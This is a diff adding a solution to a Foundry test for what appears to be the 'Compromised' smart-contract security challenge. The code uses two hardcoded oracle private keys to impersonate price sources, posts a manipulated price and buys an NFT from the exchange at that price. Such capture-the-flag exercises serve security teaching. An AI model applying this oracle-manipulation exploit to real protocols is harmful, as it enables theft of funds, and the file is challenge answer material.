@@ -75,7 +75,31 @@ contract CompromisedChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_compromised() public checkSolved {
-        
+        uint256 privateKey1 = 0x68bd020ad186b647a691c6a5c0c1529f21ecd09dcc45241402ac60ba377c4159;
+        uint256 privateKey2 = 0x7d15bba26c523683bfc3dc7cdc5d1b8a2744447597cf4da1705cf6c993063744;
+
+        address source1 = vm.addr(privateKey1);
+        address source2 = vm.addr(privateKey2);
+
+        uint256 currentPrice = oracle.getMedianPrice(nft.symbol());
+        console.log(currentPrice);
+
+        vm.startPrank(source1);
+        oracle.postPrice(nft.symbol(),PLAYER_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+
+        vm.startPrank(source2);
+        oracle.postPrice(nft.symbol(),PLAYER_INITIAL_ETH_BALANCE);
+        vm.stopPrank();
+
+        // uint256 newPrice = oracle.getMedianPrice(nft.symbol());
+        // console.log(newPrice);
+
+        vm.startPrank(player);
+        exchange.buyOne{value : PLAYER_INITIAL_ETH_BALANCE}();
+        vm.stopPrank();
+
+
     }
 
     /**
